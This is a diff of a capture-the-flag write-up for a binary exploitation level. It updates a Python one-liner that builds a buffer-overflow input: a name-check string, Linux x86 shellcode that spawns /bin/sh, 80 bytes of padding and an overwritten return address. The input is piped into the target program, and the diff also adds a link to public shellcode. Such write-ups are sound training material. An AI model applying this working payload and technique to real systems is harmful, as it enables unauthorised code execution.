@@ -57,7 +57,7 @@ eip            0x37634136       0x37634136
 
 which is 80 
 
-and shellcode from 
+and shellcode from https://raw.githubusercontent.com/offensive-security/exploit-database/master/shellcodes/linux_x86/47513.c
 
 ## 3 - Compose attack input and run
 
@@ -66,7 +66,8 @@ For first input add `dat_wil` to pass the name check and `shellcode`
 For the second input using offset 80 and `a_user_name` address + 7 (to skip dat_will) override EIP register to redirect program flow to the shellcode
 
 ```sh
-python -c 'sc = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";print "dat_wil" + sc + "\n" + "A" * 80 + "0x0804a047"[2:].decode("hex")[::-1]' > /tmp/exp1
+rm /tmp/exp1
+python -c 'sc = "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80";print "dat_wil" + sc + "\n" + "A" * 80 + "0x0804a047"[2:].decode("hex")[::-1]' > /tmp/exp1
 cat /tmp/exp1 - | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
